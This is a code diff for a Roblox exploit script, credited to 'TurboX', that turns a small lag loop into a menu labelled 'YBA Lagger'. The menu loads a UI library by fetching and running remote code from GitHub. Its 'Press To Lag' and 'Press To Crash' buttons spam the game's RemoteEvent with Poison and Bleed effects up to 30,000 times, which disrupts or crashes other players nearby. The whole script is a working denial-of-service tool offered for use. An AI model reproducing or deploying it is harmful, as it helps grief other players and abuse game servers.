@@ -1,5 +1,43 @@
 local player = game.Players.LocalPlayer
-for i = 1, lagcount do
-    player.Character.RemoteEvent:FireServer("Poison", {Duration = time, TotalDamage = 0.0001})
-    player.Character.RemoteEvent:FireServer("Bleed", {Duration = time, TotalDamage = 0.0001})
-end
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+OrionLib:MakeNotification({
+	Name = "YBA Lagger",
+	Content = "Credits: TurboX",
+	Image = "rbxassetid://4483345998",
+	Time = 10
+})
+local Window = OrionLib:MakeWindow({Name = "YBA Lagger", HidePremium = false, SaveConfig = true, ConfigFolder = "Crasher", IntroText = "TurboX"})
+local Crasher = Window:MakeTab({
+	Name = "Lagger",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Crasher:AddLabel("TURN OFF DAMAGE INDICATOR IN YBA SETTINGS")
+Crasher:AddLabel("CRASH/LAG ONLY WORK NEAR PEOPLE")
+Crasher:AddLabel("LAG WORKS FOR 30 SECONDS YOU CAN SPAM IT")
+Crasher:AddLabel("Credits: TurboX  Version: 1.0")
+Crasher:AddButton({
+	Name = "Press To Lag",
+	Callback = function()
+      		for i = 1, 750 do
+    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 30, TotalDamage = 0.0001})
+    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 30, TotalDamage = 0.0001})
+			end
+  	end    
+})
+Crasher:AddButton({
+	Name = "Press To Crash",
+	Callback = function()
+      		for i = 1, 30000 do
+    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 1, TotalDamage = 0.0001})
+    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 1, TotalDamage = 0.0001})
+			end
+  	end    
+})
+Crasher:AddButton({
+	Name = "Destroy UI",
+	Callback = function()
+      		OrionLib:Destroy()
+  	end    
+})
+OrionLib:Init()
